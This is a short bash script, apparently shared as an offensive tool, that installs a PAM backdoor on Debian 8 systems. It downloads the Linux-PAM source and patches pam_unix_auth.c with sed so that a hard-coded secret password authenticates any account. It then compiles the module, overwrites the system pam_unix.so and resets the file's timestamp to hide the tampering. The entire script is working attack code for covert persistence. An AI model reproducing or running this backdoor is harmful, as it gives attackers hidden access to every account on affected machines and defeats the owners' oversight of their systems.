#!/bin/bash

#. Author : Aur√©lien DUBUS
#. Version : 1.0
#. Description : Install PAM Backdoor on Debian 8 machines ( just change the source package for other versions)

SECRETPASS=''
pamFile="/lib/x86_64-linux-gnu/security/pam_unix.so"
oldtime=$(stat -c '%z' ${pamFile})


echo 'Pam backdoor starting!'
#mirror_url='http://debian.securedservers.com/kernel/pub/linux/libs/pam/library/Linux-PAM-1.1.1.tar.gz'
mirror_url='http://http.debian.net/debian/pool/main/p/pam/pam_1.1.8.orig.tar.gz'
echo 'Fetching from '$mirror_url
wget $mirror_url #fetch the roll
#tar zxf Linux-PAM-1.1.1.tar.gz #untar
#cd Linux-PAM-1.1.1
tar zxf pam_1.1.8.orig.tar.gz
cd Linux-PAM-1.1.8
#find and replace
sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif(strcmp(p,"'$SECRETPASS'")==0){retval=PAM_SUCCESS;}/g' modules/pam_unix/pam_unix_auth.c
./configure && make
#copy modified pam_unix.so
cp -rf modules/pam_unix/.libs/pam_unix.so ${pamFile}
touch -d "$oldtime" ${pamFile}
cd .. && rm -rf Linux-PAM.1.1.8

exit 0
